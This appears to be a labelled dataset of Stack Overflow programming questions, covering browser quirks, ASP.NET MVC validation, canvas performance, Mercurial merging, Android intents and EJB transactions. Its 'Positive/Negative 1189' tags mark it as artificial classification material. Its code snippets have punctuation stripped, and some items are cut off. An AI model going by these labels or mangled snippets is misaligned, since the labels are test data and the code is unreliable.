Positive 1189 pIm having this real strange issue where IE8 isnt parsing my data attributes on the codeltbodygtcode tag.p  pFor example, I have the following htmlp  pcodeltbody datacontrollerhomeCtrlgtcodep  pWhen i inspect the page in IE8 developer tools that attribute is completely missing. It is confirmed when i execute javascript in the console it returns nullp  pcodedocument.body.getAttributedatacontrollercodep  pIf i view the source, the data attribute is indeed there, IE8 just seems to ignore it or remove itp  pMore strangely, if i have a div within body.. for examplep  pcodeltdiv idmain datacontrollerhomeCtrlgtcode p  pThis works I can see it in the developer tools and I can read its value with javascript. So bizarrep  pHas anyone come across this before What would cause this to happenp

Positive 1189 pI currently implementing a desktop application for my ASP.NET website. I am trying to use codeWebBrowsercode class to allow user to login to the site and then use codeWebClientcode to make api calls afterward. Based on research and experiment,  codeWebBrowsercode class and IE share the same cookie which is good. But I am having a hard time copying the authenticated cookie into codeCookieContainercode for my codeWebClientcode. p  pI tried to use codeApplication.GetCookiecode which calls codeInternetGetCookiecode Win32API to get the cookie from IE, the problem is that it does not return the authentication cookie. It only returns cookies set by my site such as Language and User preferences. The cookie should be persistent cookie since I am still logged in after I close and reopen the browser. Any thoughtsp

Positive 1189 pI have a WCF service which provides an endpoint to dynamically generate a QRCode image. The image is first written to a memory stream codetempStreamcode. I then have the following code in the endpointp  precodeHttpResponse response  HttpContext.Current.Response response.Clear response.ClearContent response.ClearHeaders  response.Buffer  false response.ContentType  imagepng response.CacheControl  NoCache  response.AddHeaderContentLength, tempStream.Length.ToString response.AddHeaderAcceptRanges, bytes  tempStream.WriteToresponse.OutputStream  response.Flush response.End codepre  pIt works fine in Firefox. The image is downloaded if I hit the endpoint manually and it loads inline if I reference the endpoint as the codesrccode attribute in an codeimgcode tag. However, in IE, the image does not load inline in an codeimgcode tag, and if I try to hit the endpoint manually, it loads the full image the first time but any subsequent refreshes seemingly until the browser is restarted, it only loads part of the image.p  pUpon inspection of the network tab in the F12 window, it seems to be downloading exactly 1.00 KB of data including headers from the server, meaning it gets about 750 KB of image data. Then it makes another identical request to the server and gets only the headers back with no image data. The codeContentLengthcode header is set correctly to the size of the image IE just doesnt download that much. Again, Firefox is fine.p  pMy coworker recommended that I set codetransferModecode to codeStreamedcode in codeWeb.configcode, which I did, but that didnt work either. How can I get IE to download the entire image in one gop  pstrongEDITstrongp  pI should note that when running the WCF service in Visual Studios IIS Express server, Internet Explorer works fine. It is only when the application is deployed to IIS 7.5 that the problem occurs. Firefox works fine in both environments.p

Positive 1189 pa hrefhttpjsfiddle.netPointy2xr0chrp8 relnofollowHere is a JSFiddle that demonstrates what I describe belowap  pIve been trying to track down a weird Edge rendering issue. I have not been able to reproduce the problem, but I have been able to reproduce some odd behavior that I think is directly related. Ive got a background trick I use on some full pages and some page headers that involves creating a bunch of random codeltdivgtcode elements with very low opacity that is, almost transparent and then randomly transforming them around. Its sortof dumb but its been working for me without any issue in Firefox and Chrome for a while.p  pI recently started testing in Edge general testing nothing specific about the background, which I dont spend any time thinking about normally, and very soon noticed that, randomly, mousing over things with simple codehovercode style shifts like, darkening button background color would cause a nearlyopaque gray box to show up covering the element. The gray box would stick around for an unpredictable amount of time, and then go away randomly. It happened sometimes on just a few elements on the page, and sometimes not at all.p  pThat as you can imagine has been making me crazy, partly because I cannot reproduce it in a CodePen or JSFiddle. While trying to investigate, I started noticing that typing into an input field on one affected page the login page in fact was extremely sluggish. Im using a VirtualBox VM for this not a factor, I dont think, as a coworker with native Windows 10 sees exactly the same problems so I originally thought it was just latency through that, but after a while it became clear that it wasnt.p  pOn one of several attempts to randomly change something to see what was going on, I disabled the random codeltdivgtcode background, and both the gray box problem and the sluggish input problem went away.p  pThe fiddle linked above is a little simpler than the real setup, but not much. Its simple markupp  precodeltdiv classcontainergt     ltinputgt     ltbrgt     ltbutton classtogglegtToggle Backgroundltbuttongt ltdivgt codepre  pand then some CSSp  precodebody      backgroundcolor blue     textalign center  .container      position relative     display inlineblock     margintop 100px  .shape      position absolute     backgroundcolor white  .noshapes .shape      display none  codepre  pThe JavaScript to make the shapes is also simplep  precodefor var i  0 i lt 2000 i      ltdivgt,          class shape,         css              transform translate  Math.random  1000  px,   Math.random  1000  px,             opacity Math.random  5  100,             height Math.random  200  px,             width Math.random  200  px              .prependTobody  codepre  pOn my real page, I only make about 100 random elements.p  pOn Firefox and Chrome, the input box is completely unaffected by the presence or absence of the background elements. However, in Edge, theres a distinct lag when typing into the input field when the elements are visible. Its as if the renderer is trying to do some sort of collision calculation as it updates the codeltinputgtcode display as the value changes.p  pI wish I could reproduce the even weirder gray box problem, but I havent been successful. Its clearly a rendering bug, much like many Ive seen over the years with predecessor IE in that the manifestation involves a lot of randomness, and seemingly uninteresting events like the window losing focus, or random mouse movements even trigger changes. Its a little odd that Edge would suffer from such an issue, but then maybe not. Does Edge still have the weird hasLayout thingp  pIll probably end up just sniffing for Edge which seems really sad because I cant think of any feature detect approach for the problem.p  pAnybody else seen this  I havent found mention of it so far.p  pemeditem I think I see the slow input issue in IE11, but I cannot reproduce the gray box problem there.p

Negative 1189 pThis I think is related to my use of the nlog C API and my question on the nlog forum is a hrefhttpwww.nabble.comNLogCproblemswithVB6IDEtt19662300s6167.html relnofollowherea the purpose of my asking this question here is to get a wider audience to my problem and perhaps to also get some more general ideas behind the VB6 IDEs failure to build in my particular scenario.p  pBriefly, the problem that I am having is that I am having trouble building VB6 components which reference unmanaged C components which have calls to nlogs CC API which is defined in NLogC.DLL. The build problems are not occurring during compile time, they are occurring when the binary is being built which suggests to me that its some kind of linker type problem Dont know enough about how VB6 binaries are produced to tell. The VB6 binary is produced, but it is corrupted and crashes shortly after it is invoked.p  pHas anyone had any similar experiences with VB6 doesnt have to be related to nlog or C p  pedit Thanks for all the responses to this rather obscure problem. Still no headway unfortunately my findings since I posted thisp  ol liTweaking the compile options doesnt appear to help in this problem.li liAdding a reference to the nlogenabled C component from a blank VB6 project doesnt crash it or cause weird build problems. So it isnt a native VB6 issue, possibly an issue with the interaction between nlog and the various components and 3rd party libraries used by other referenced componentsli liAs for C calling conventions the nlogenabled C component is  as far as I can see  compliant to these conventions and indeed works fine when referenced by VB6 as long as it is not making any nlog API calls. Not sure if the nlogc.DLL itself is VB6 compliant but I would have thought that that is immaterial since the API calls are being made from the C component VB6 shouldnt know or care about what the C component is referencing thats as far as my understanding on this goes...li ol  pedit2 I should also note that the error message obtained during build is Errors during load. Please refer to xxx for details. When I bring up the log file, all that there is in there is Cannot load control xxx. Interestingly, all references to that particular control disappears from that particular project resulting in compile errors if I were to try to build again.p

Negative 1189 pSimple I hope, HTML question.p  pLets say I have a column group that spans 3 columns. But it also spans 9 rows. But in actuality, I want there to be 3 levels of columns so basically, 3 columns, split across 9 rows.  The only objectives really arep  pa avoid embedding tables for various reasons b keep the sections modular. c allow for styling of the semantically modular areas.p  pSo in the end, I would have something visually likep  precode    col 1   col 2  col 3      row 1   row 1  row 1      row 2   row 2  row 2      row 3   row 3  row 3       col 4   col 5  col 6      row 4   row 4  row 4      row 5   row 5  row 5      row 6   row 6  row 6       col 7   col 2  col 3      row 7   row 7  row 7      row 8   row 8  row 8      row 9   row 9  row 9  codepre  pI was able to get the column groups to work to keep the 3 columns together, but an attempt to add rowspan failed.Trying to wrap the row groups in tr tags was no good at all. and as far as i an tell, there is no real rowgroup tag.p  pUpdatep  pAfter getting feedback, I realized I should give more details on what I have in mind.p  pIll use the term quad, supercolumn, superrow to refer to groups of data. So take this examplep  precode               Quad 1       Quad 2 superrow1  a  b  c  d  e  f  superrow2  1  2  3  4  5  6  superrow3  A  B  C  D  E  F                  Quad 3       Quad 4 superrow4  g  h  i  j  k  l  superrow5  7  8  9  0  1  2  superrow6  G  H  I  J  K  L  codepre  pFor simplicity sake, just imagine that across the top I wrote supercol 1  6.p  pSo, the data in quad 1 is all related, and the data in superrow 1 is all related, and the data in supercol 1 is all related. So, using the above data,p  pa has a direct relationship with f, C, and G, but f, C, and G have no direct relationship with each other.p  pAnother way of thinking about it is Sudoku, where each quad, column, and row contain the set of 19, making any of the 81 data points related directly to any other data points it shares a row, column, or quad with, but not to any data points.p  pQuick updatep  pOne last thing, sorry. Its important that these relationships be grouped semantically in the HTML so that, should someone be using a screen reader or nontraditional browser, they can know where they are in the table at any given point, ie You are in Quad 1, Super Col 1, Column 4, Super Row 1, Row 1. The data is Ohio.p  pThis makes styling, crossbrowser compatibility, accessibility all much easier, as well as an moving around such as AccessKeys, Scope, etc.p

Negative 1189 pHeres the setup I have a serverbased application.  So, all the data is on a server call it server A and users connect to that server using a desktopbased rich client.  The rich client also allows the user to connect to some other server call it X, that is completely unrelated to server A.p  pQuestion The user has logged into server X from the rich client, and so the rich client has the right cookie to authenticate against server X.  Now, the user makes an invocation on server A, which requires server A to go out and get some data from server X.  Is it possible to somehow circumvent having server A to authenticate against server X given that the rich client has already authenticated against server X.  Is there some way to share the cookie with server A acting as the second client  Or some way to have server A forward server Xs authentication request back to the rich client and having it resolve against the cookie in the rich client.

Negative 1189 pOk, lets assume we are working with ASP.NET MVC 2 latest and greatest preview and we want to create AJAX user interface with jQuery. So what are our real options herep  pstrongOption 1strong  Pass Json from the Controller to the view, and then the view submits Json back to the controller. This means in the order givenp  ol liUser opens some View lets say  strongInvoicesJanuarystrong which has to visualize a list of data e.g. codeltIEnumerableltX.Y.Z.Models.Invoicegtgtcodeli liController retrieves the Model from the repository assuming we are using repository pattern.li liController creates a new instance of a class which we will serialize to Json. The reasaon we do this, is because the model may not be serializable circular reference strongftlstrongli liController populates the soontobeserialized class with datali liController serializes the class to Json and passes it the view.li liUser does some change and submits the formli liThe View submits back Json to the controllerli listrongThe Controller now must manually validate the input, because the Json passed does not bind to a Modelstrongli ol  pSee, if our View is communicating to the controller via Json, we lose the Model validation, which IMHO is incredible disadvantage. In this case, forget about data annotations and stuff.p  pstrongOption 2strong  Ok, the alternative of the first approach is to pass the Models to the Views, which is the default behavior in the template when you start a new project.p  ol liWe pass a strong typed model to the viewli liThe view renders the appropriate html and javascript, sticking to the model property names. strongThis is importantstrongli liThe user submits the form. If we stick to the model names, when we code.serializecode the form and submit it to the controller it will map to a model.li liThere is no Json mapping. The submitted form directly binds to a strongly typed model, hence, we can use the model validation. E.g. we keep the business logic where it should be.li ol  pProblem with this approach is, if we refactor some of the Models change property names, types, etc, the javascript we wrote would become invalid. We will have to manually refactor the scripting and hope we dont miss something. There is no way you can test it either.p  pOk, the question is  how to write an AJAX front end, which keeps the business logic validation in the model e.g. controller passes and receives a Model type, but in the same time doesnt screw up the javascript and html when we refactor the modelp

Ive used city, then country, but the problem is that the user then has to go backwards after changing the country.p  pThe other problem is what do you do about citiescountries not in your list  If citycountry are both drop downs, then the user cant type their own city if it is missing.  But if you have a dropdown and a textbox, that makes it unwieldy you end up with 4 controls to enter 2 pieces of data.p  pAre there any examples websites where the citycountry dropdown pair are done in a very useable and clear mannerp

Negative 1189 pIm looking for some guidance on the overall architecture of this little system Im building.p  pCurrently, I have an app that is deployed and updated via xcopy to a few servers. This works well for updating the code, but it does not work well for updating the period of the codes execution, since it is setup as a windows scheduled task to run every hour.

And the next hour, the task scheduler will run the new exe.p  pId like to change it to work this way.p  pMy app runs as a Windows Service and uses System.Threading.Timer to wait a given duration, and then execute the code. This way, part of the process could check the database and if necessary reduce the period of execution for a given server.p  pThe issue there, is that since the .exe would be running as a service, it would not allow for easy updaing via xcopy since the file will be in use all the time.p  pAny thoughts on how I should set this up to be able to do easy xcopy updates, while running as a windows service Is that even possiblep

So therefore I decided to start a new question which deals only with this concern.p  pIm not a C expert, so I may be wrong in the following statements, but Ill give it a shot anyway. A C compiler may optimize away portions of code which it will recognize never to be executed or never exited such as loops. Here is an examplep  precode void test      bool escape  false      while  escape   Will never be exited       Do something useful after having escaped  codepre  pThe compiler would most likely recognize that the loop will never be exited as the code never changes the value of codeescapecode so that the loop is exited. This makes the loop useless.p  pNow, if we were to change the variable to a pointer, would the compiler still optimize away the loop Say the code looks like sop  precode void test bool escape       while  escape   Will this be executed       Do something useful after having escaped  codepre  pMy suspicion is that the compiler emwillem do away with the loop, or else the keyword codevolatilecode would be redundant, yes. But what about when working with threads  where it is in fact modified but outside the function, and maybe even outside that C file entirely  would the compiler still remove the loop Does it make a difference if the variable pointed to by codeescapecode is a global variable, or a local variable inside another function Can the compiler make this detection In a hrefhttpstackoverflow.comquestions3612505isvolatileneededinthismultithreadedccode36126523612652this questiona, some say that the compiler will not optimize the loop if library functions are invoked inside the loop. What mechanisms are then in place when using library functions which prevent this optimizationp
Negative 1189 pOK, so maybe I am really missing something here, but how is it so difficult to do effective server amp client side validation in MVC 2 Here are a few examplesp  ol lipI want to use a variable length list. I follow a great tutorial like Steve Sandersons variable length list overview. I want to create a custom validator like RequiredIf. My variable length list is a collection using Sandersons HTML helper for collections, and the custom validators dont fire even with the correct client validation scripts inplace that work fine for nonvariable length lists... isnt a variable length list that needs to post back as an enumerable collection to the [HttpPost] action pretty common Why is this validation so painful on the client sidewhen you wish to derive from the validation annotation that was associated with your class In this case, serverside validation actually works... but clientside seems to be impossible when using a collection and a variablelength list. Sure this could be something to do with the HTML element ID naming from the indexGuids of the collection, but it starts to get so convoluted...pli lipI have a ViewModel that may be filled with different types of data. I want to validate in some cases, but not in others. Typically I am filling my ViewModel from a domain class that already has data annotations for validation. However, the ViewModel would need its own data annotations to perform validation correctly. For some fields I want validation, but for other uses of the same fieldwhen filled with different dataI dont want validation. I cannot reference a dynamic property in my data validation annotation though... annotations are static. This must be based on when they bind, etc. Sure I can make a custom validator that gets REALLY crazy and actually references the literal values of other fields in its attempt to decide whether to validate drawing in booleans for required, and strings for regex or errormessages... but ouch Seriously, is it this hardpli ol  pWhat is frustrating is that the more I try to follow the patterns provided by MVC, I keep stumbling into things that COULD be so darn simple but get so painful when you cant deviate from the pattern. If data validation annotation is the correct approach, it really seems like it needs to support dynamically set properties and have a better autorendering of client JS specifically for custom validators to avoid these headaches. Im almost done trying to make clientside validation work in these situations.p  pHas anyone used a validation package that makes this process easier I am not familiar enough with the support for the MVC 2 compatible validation packages to know whether theyre worthwhile. Ive skimmed Fluent Validation for example, but need to learn more. Does it allow dynamic validation assignment and client valdiation for custom validatorsp  pOne idea I am considering is simply adding data fields in my domain model that provide a viewusable string which a package like JQuery validation can pickup and use to avoid this entire situation mentioned above. That way my domain model can use annotations to protect its data integrity and will serve as a laststop for any insert issue, and my client side can just have a string to throw into a class attribute for a scripted validator to use without having to go through the craziness of exposing custom validators on the clientside with a bunch of overkillinterpretation of IEnumerable GetClientValidationRules... p  pWhat gives Is there a better wayp

Negative 1189 pI am working with a relatively large Canvas where various complex stuff is drawn to. I then want to save the Canvas state, so I can quickly reset it to the state it now is at a later point. I use getImageData for this and store the data in a variable. I then draw some more stuff to the canvas and will later reset the Canvas to where it was when I saved its state, using putImageData. p  pHowever, it turns out, that putImageData is very slow. Infact, it is slower than simply redrawing the entire Canvas from scratch, which involves several drawImage covering most of the surface, and over 40.000 lineTo operations followed up by strokes and fills.p  pRedrawing the approx 2000 x 5000 pixel canvas from scratch takes  170ms, using putImageData though  takes whopping 240ms. Why is putImageData so slow compared to redrawing the canvas, although redrawing the canvas involves filling nearly the entire canvas with drawImage and then again filling roughly 50 of the canvas with polygons using lineTo, stroke and fill. So basicly every single pixel ist touched at least once when redrawing.p  pBecause drawImage seems to be so much faster then putImageData after all, the drawImage part of redrawing the canvas takes less than 30 ms.  I decided to try to save the state of the canvas not using getImageData, but instead using canvas.toDataURL and then creating an Image from the data URL which I would stick into drawImage to draw it to the canvas. Turns out this whole procedure is much faster and only takes roughly 35ms to complete.p  pSo why is putImageData so much slower then the alternatives using getDataURL or simply redrawing How could I speed things up further Is there and if, what is in general the best way to store the state of a canvasp  pAll the numbers are measured using Firebug from within Firefoxp

Before I do so Im doing the usual pros  cons list.p  pOne of my pros is that merging is superior in Mercurial, but so far Im failing to find compelling evidence of that. Namely, there is a statement made on HgInit.com that Ive been unable to verifyp  blockquote   pFor example, if I change a function a little bit, and then move it somewhere else, Subversion doesnt really remember those steps, so when it comes time to merge, it might think that a new function just showed up out of the blue. Whereas Mercurial will remember those things separately function changed, function moved, which means that if you also changed that function a little bit, it is much more likely that Mercurial will successfully merge our changes.p blockquote  pThis would be extremely compelling functionality, but as far as I can tell, its just hot air. Ive been unable to verify the above statement.  p  pI created a Mercurial repository, did a Hello World and then cloned it. In one I modified the function, committed it and then moved it, and then committed it.  In the other I simply added another output line in the function and committed.p  pWhen I merge, I get basically the same merge conflict I would get using Subversion.p  pI get that mercurial can track a hrefhttpstackoverflow.comquestions2475831merginghggitvssvn24866622486662file renamesa better and that there are other advantages to DVCS besides merging, but Im interested in this example.  Is Joel Spolsky offbase here, or am I missing somethingp  pIm not experienced in this area, but it does seem like since Mercurial keeps more information that it emcouldem, in theory, do better at merging if developers also did frequent checkins. For example, I see it as feasible for Mercurial to get contextual changes from comparing multiple changes, e.g., I modify a function, check in, move the function, check in, and Mercurial associates those two pieces.p  pHowever, Mercurials merging doesnt seem to actually take advantage of the added information, and appears to be operate the same way as Subversion.  Is this correctp

Negative 1189 pIm trying to pass an ArrayList from my first Activity to the next one. Basically, the first activity parses an XML file and creates an ArrayList with objects inside. What I want to do is send that ArrayList to my second activity and show some of the object data in a ListView.p  pI thought of doing this with an intent, but it looks like only primitive datatypes are usually passed through intents. Is this rightp  pIf so, what would be a better solution to pass the data Certainly Android must provide something to be able to do this kind of thing.p  pAny helpcode examples are really appreciated..p  pThanksp  pstrongEDITstrongp  pemI solved this by first creating and calling the intent, and only parsing the XML in the Activity that I called. This way I didnt need to pass the objects anymore.

Negative 1189 pI have a UITableView where numberOfSectionsInTableView and numberOfRowsInSection are being called twice, with scope issues on the second run.  If I mask the problem, I get a scope issue on the first run of cellForRowAtIndexPath.p  pMost data all comes from an NSDictionary which is configured during viewDidLoad.  I also have an NSArray configured at the same time.  Once set they are never changed nor released.p  pWhen numberOfSectionsInTableView is called the first time, its fine.  Counts the elements as needed etc.  Its then immediately called a second time no idea why.  On the second run, it cannot access the NSDictionary or NSArray items.  Crash even when trying to NSLog them.  For examplep  precodeNSLogtheMainDictionary ,theMainDictionary codepre  pusually results in EXCBADADDRESS but occasionally something like thisp  precodetheMainDictionary ltUITableViewSeparatorView 0x4e73680 frame  0 307 320 1 opaque  NO autoresize  W layer  ltCALayer 0x4e4bf20gtgt codepre  pAgain, this same line runs fine logging the dictionary as expected the first run through.p  pIf I mask the problem by returning a fixed NSInteger, numberOfRowsInSection then does the same thing.  If I mask numberOfRowsInSection, cellForRowAtIndexPath crashes on the first run.  Same issue though  cant access theMainDictionary or the related NSArray.p  pI cant figure out why theyre running twice  theres no reloadData anywhere.  Nor do I know why the second call runs any differently.  Any assistance greatly appreciated.p

Negative 1189 pThis is part of my essay for a 4000 level web applications final class and I want to be very sure that I have this correct. So if you guys would let me know I have a hard time wrapping my mind around this.p  pWhen a form is submitted it is sent to the HTTP Server, in my case Apache, which uses the HTTP protocol. It then looks to see whether the method was a GET or a POST , it also receives arguments from the form in name value pairs, also known as a query string. If the method was  a GET method then the query string is  appended to the URL. If the method was a POST method then it is put into the request body. Then the server handles the request and reponds with a HTTP Status code. If the number is 20X then it is was a success, if the number is 40X then there was an error.p

Is byte[] faster Or why does it matter I can write everything I write with the bytes because even a string is composed into bytes while transfer, so why do we have two multiple methods Only Google Chrome 15 Beta and 16 Dev supports binary transfer, so I was thinking of using Base64 encodingdecoding on both client and server. Is this the only difference What if I just read each byte, compose them into a string and send them I think, only difference will be that not all bytes are String chars, so I wouuld just add an overhead when converting to a Stringp  ptldr  What is the difference between Binary transfer and String transferp

Negative 1189 pHow can I write a PostSharp aspect to apply an attribute to a class The scenario Im considering is a WCF entity or domain object that needs to be decorated with the codeDataContractcode attribute.

It has the DataContract attribute applied to the class. Doing this by hand is tedious and not unique. Id really just like to write a single aspect that can be applied a my Domain namespace. It would then apply the serialization related attributes for me. This way I can just focus on developing entity objects, and not worry about the serialization pluming details. p  pI have found documentation on PostSharps website for injecting code before, after, and instead of methods.

Negative 1189 pAs per the developer road map  offline access is being deprecated. So whats the alternative  I know we can get extended token that will expire in 60 days, but how about the offline access  The documentation isnt clear about weather this token works on or not when user is not logged in.p  pSee a hrefhttpdevelopers.facebook.comdocsreferencejavascriptFB.logout relnofollowFB.logouta It says calling FB.logout will invalidate any existing token unless you have offlineaccess permission, How does this affect to new extended token  If it invalidates the extended token as well, is there any alternative.p  pThe old offlineaccess permission would let the app make calls to graph API even when user isnt logged in, does the extended token work in same way  if not whats the alternative p
Negative 1189 pFirst of all, I must say that Im very new to Google Closure, but Im learning p  pOkay, so Im making a web app thats going to be pretty big, and I thought it would be good to manage all the AJAX requests in one XhrManager. No problem there. p  pBut, is it possible to have some kind of emdefault callbackem that would check for errors first, display them if necessary and then when it passes, launch the real callback Im talking about a feature like the a hrefhttpamplifyjs.comapirequestdecoders relnofollowdecoders in amplify.jsa. Heres their explanation p  blockquote   blockquote     pDecoders allow you to parse an ajax response before calling the success or error callback. This allows you to return data marked with a status and react accordingly. This also allows you to manipulate the data any way you want before passing the data along to the callback.p   blockquote blockquote  pI know it sounds complicated and it is, really, so the fact that Im not that good at explaining helps a good deal too, but yeah. p  pThe solution I have in my head right now is creating an object that stores all the real callbacks, of which the errorchecking callback would execute the correct one after it finished checking, but I feel thats a bit hackish and I think there has to be a better way for this. p

Negative 1189 pIve seen a few questions where developers were asking about checking if a record already exists before insert to avoid a primary key constraint violation... this is not a big problem IMHO.  But, what if the condition I want to check is not to avoid a DB error, because no DB error will be raised if the condition exists during insert.p  pFor example, a large denormalized table that has several state values, but I only want to allow inserting of a new row that only changes the state of a single state value column at a time.p  pThe columns could be something likep  precodeid animalid healthproblemid treatmentplan treatmentapproved treatmentscheduled treatmentinprogress treatmentcomplete whoupdated whenupdated codepre  pWhen a user updates a state field in their application view, the other unchanged information will be used as part of the insert strongifstrong it matches what they currently see, otherwise they will be notified, and then they can review the current information and try again.p  pFor example, this would prevent two different users scheduling something twice with no immediate notification to one of the users.p  pNow lets pretend this table is going to be used heavily and concurrently my example may not the best for this....  For those with astounding imagination lets also assume that there is a reasonable likelihood people will be working on the same animal at the same time. Lets also assume data integrity is important.p  pObviously, if its going to be used concurrently and heavily locking the whole table is NOT a good solution, but certainly would insure data integrity.p  ol liIs there a performant solution to this problemli liIs bad database design the culprit here ie. denormalization of the data.  If that is the case what design would solve this problemli liIs this design ok if its not going to be used heavily, and there is a low likelihood of people working on the same animal Note data integrity is still extremely important.li liSame question as 3, but with the requirement of data integrity being less important.li ol  pstrongNote My example, is an example this is not something Im doing with data on animals strongp  pOpinions andor details on how to solve solve this generically with existing relational databases is certainly preferred.p

Negative 1189 pIm trying to write a simple voxel raycaster as a learning exercise. This is purely CPU based for now until I figure out how things work exactly  fow now, OpenGL is just abused to blit the generated bitmap to the screen as often as possible.p  pNow I have gotten to the point where a perspectiveprojection camera can move through the world and I can render mostly, minus some artifacts that need investigation perspectivecorrect 3dimensional views of the world, which is basically empty but contains a voxel cube of the Stanford Bunny.p  pSo I have a camera that I can move up and down, strafe left and right and walk forwardbackward  all axisaligned so far, no camera rotations. Herein lies my problem.p  pScreenshots a hrefhttpdl.dropbox.comu2166329voxcast01.png relnofollow1 raycasting voxels while...a a hrefhttpdl.dropbox.comu2166329voxcast02.png relnofollow...2 the camera remains...a a hrefhttpdl.dropbox.comu2166329voxcast03.png relnofollow...3 strictly axisaligned.ap  pNow I have for a few days been trying to get rotation to work. The basic logic and theory behind matrices and 3D rotations, in theory, is very clear to me. Yet I have only ever achieved a 2.5 rendering when the camera rotates... fisheyey, bit like in Google Streetview even though I have a volumetric world representation, it seems no matter what I try like I would first create a rendering from the front view, then rotate that flat rendering according to camera rotation. Needless to say, Im by now aware that rotating rays is not particularly necessary and errorprone.p  pStill, in my most recent setup, with the most simplified raycast raypositionanddirection algorithm possible, my rotation still produces the same fisheyey flatrenderrotated style looksp  pa hrefhttpdl.dropbox.comu2166329voxcast04.png relnofollowcamera rotated to the right by 39 degreesa  note how the blueshaded lefthand side of the cube from screen 2 is not visible in this rotation, yet by now it really shouldp  pNow of course Im aware of this in a simple axisalignednorotationsetup like I had in the beginning, the ray simply traverses in small steps the positive zdirection, diverging to the left or right and top or bottom only depending on pixel position and projection matrix. As I rotate the camera to the right or left  ie I rotate it around the Yaxis  those very steps should be simply transformed by the proper rotation matrix, right So for forwardtraversal the Zstep gets a bit smaller the more the cam rotates, offset by an increase in the Xstep. Yet for the pixelpositionbased horizontalverticaldivergence, increasing fractions of the xstep need to be added to the zstep. Somehow, none of my many matrices that I experimented with, nor my experiments with matrixless hardcoded verbose sincos calculations really get this part right.p  pHeres my basic perray pretraversal algorithm  syntax in Go, but take it as pseudocodep  ul listrongfxstrong and strongfystrong pixel positions x and yli listrongrayPosstrong vec3 for the ray starting position in worldspace calculated as belowli listrongrayDirstrong vec3 for the xyzsteps to be added to rayPos in each step during ray traversalli listrongrayStepstrong a temporary vec3li listrongcamPosstrong vec3 for the camera position in world spaceli listrongcamRadstrong vec3 for camera rotation in radiansli listrongpmatstrong typical perspective projection matrixli ul  pThe algorithm  pseudocodep  precode 1 rayPos is for now this pixel, as a vector on the view plane in 3d, at The Origin rayPos.X, rayPos.Y, rayPos.Z  fx  width  0.5, fy  height  0.5, 0   2 rotate around Y axis depending on cam rotation.

Negative 1189 pRecently, I started writing a program to compare DNA sequence.  As the alphabet only consists of four letters ATCG, compressing each character to 2 bits seemed like it would offer faster comparisons are two characters the same or different.

Creator method.         stateMachine.create             events  [   name Enter, from Initialised, to Running ],                codepre  pNote The state machine assumes the existence of a method based on an event name. So when the Enter event fires it always tries to find an onEnter method. The state machine Im using can be found at a hrefhttpsgithub.comjakesgordonjavascriptstatemachine relnofollowhttpsgithub.comjakesgordonjavascriptstatemachineap

Negative 1189 pIm working on a larger size Python application which runs a solver on several hundred distinct problem scenarios. There is a GUI that allows the user to set up the solver configuration. In an attempt to speed this up I have implemented a multiprocessing Pool to spawn new instances of the solver module within the application.p  pWhat ends up happening is that during the pools creation four new copies of the GUI appear, which is entirely not what Im looking to have happen. Ive taken what I thought were the appropriate steps in protecting the entry point of the application as per the programming guidelines but perhaps Ive misunderstood something fundamental about the multiprocessing module.p  pIve followed the guideline in a hrefhttpstackoverflow.comquestions5957727preventingpoolprocessesfromimportingmainandglobalsthis threada in creating a minimal startup module.p  pScenarioSolver.solveOneScenario creates a new instance of the solver and scenariostosolve is a list of arguments.p  precodeprocesspool  multiprocessing.Pool4 for , result in enumerateprocesspool.imapunorderedScenarioSolver.solveOneScenario, scenariostosolve   self.processResultresult codepre  pSo, based on the limited information here, what might I have overlooked in using the Poolp  pEDIT This behavour only happens when I package the application into an executable using py2exe.

Negative 1189 pSo I have a list of links in the top portion of my site that allow a user to click on them and when this click event happens I have a javascript function that scrolls a very large list of links within a div on the page. The problem is in IE7 and how it is handling the click event when it is fired. I am using jquery to prevent the default action and this works fine in Chrome, Safari, Firefox and IE 89 but in IE7 the browser is trying to make use of the of the anchor in the default fashion. This anchors href property is just a string that helps me identify the links in the lower portion of the page. If I click the link in IE7 I get a 404 but if I hit the back button and click the link again the script works correctly and the event is handled in the correct fashion. I also tried p  precodeevent.preventDefault  event.preventDefault  event.returnValue  false codepre  pinstead of e.preventDefault but this makes no difference in how IE7 handles the click event in my scenario.p  pAny suggestions Also, on my page I have a tabbed navigation that hides the data associated with that tab if the user is currently viewing the other tab there are only 2 tabs. The content in either tab is roughly the same and the structure is exactly the same but when I execute the exact same process that is causing the error described above on the links in the first default tab, IE has no problems. p

However then some other css i dont know where overwrites these, so this also doesnt work.p  pI think there are some wp functions to add css code to the header but I dont know how exacly.p  pAny ideasp  pThanksp

Negative 1189 pIm struggling with a problem with an EJB3 class that manages a nontrivial data model. I have constraint validation exceptions being thrown when my containermanaged transactional methods commit. I want to prevent them from being wrapped in codeEJBExceptioncode, instead throwing a sane application exception that callers can handle.p  pTo wrap it in a suitable application exception, I must be able to catch it. Most of the time a simple trycatch does the job because the validation exception is thrown from an codeEntityManagercode call Ive made.p  pUnfortunately, some constraints are only checked at commit time. For example, violation of codeSizemin1code on a mapped collection is only caught when the container managed transaction commits, once it leaves my control at the end of my transactional method. I cant catch the exception thrown when validation fails and wrap it, so the container wraps it in a codejavax.transaction.RollbackExceptioncode and wraps emthatem in a cursed codeEJBExceptioncode. The caller has to catch all codeEJBExceptioncodes and go diving in the cause chain to try to find out if its a validation issue, which is emreallyem not nice.p  pIm working with container managed transactions, so my EJB looks like thisp  precodeStateless TransactionManagementTransactionManagementType.CONTAINER class TheEJB       Inject private EntityManager em      TransactionAttributeTransactionAttributeType.REQUIRESNEW     public methodOfInterest throws AppValidationException         try              For demonstrations sake create a situation thatll cause validation to             fail at committime here, like            someEntity.getCollectionWithMinSize1.removeAll            em.mergesomeEntity         catch ValidationException ex              Wont catch violations of Size on collections or other             committime only validation exceptions            throw new AppValidationExceptionex                codepre  p... where codeAppValidationExceptioncode is a checked exception or an unchecked exception annotated codeApplicationExceptioncode so it doesnt get wrapped by EJB3.p  pSometimes I can trigger an early constraint violation with an codeEntityManager.flushcode and catch that, but not always. Even then, Id emreallyem like to be able to trap databaselevel constraint violations thrown by deferred constraint checks at commit time too, and those will only emeverem arise when JTA commits.p  pHelpp  hr  pstrongAlready triedstrongp  pstrongBean managed transactionsstrong would solve my problem by allowing me to trigger the commit within code I control. Unfortunately they arent an option because bean managed transactions dont offer any equivalent of codeTransactionAttributeType.REQUIRESNEWcode  theres no way to suspend a transaction using BMT. One of the annoying oversights of JTA.p  pSee p  ul lia hrefhttpblog.bitronix.be201102whyweneedjta20Why we need JTA 2.0ali lia hrefhttponjava.compubaonjava20050720transactions.htmlBeanManaged 